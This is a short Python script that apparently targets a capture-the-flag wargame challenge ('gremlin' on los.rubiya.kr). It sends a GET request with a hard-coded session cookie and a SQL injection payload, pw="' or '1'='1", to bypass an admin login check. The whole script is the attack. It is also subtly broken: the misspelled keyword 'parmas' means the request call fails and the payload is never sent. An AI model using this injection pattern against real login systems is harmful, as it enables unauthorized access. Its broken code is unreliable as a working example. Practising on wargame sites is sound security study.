import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
params = {"id": "admin","pw": "' or '1'='1"}

r = requests.get(url, parmas=params, cookies=cookies)
print(r.text)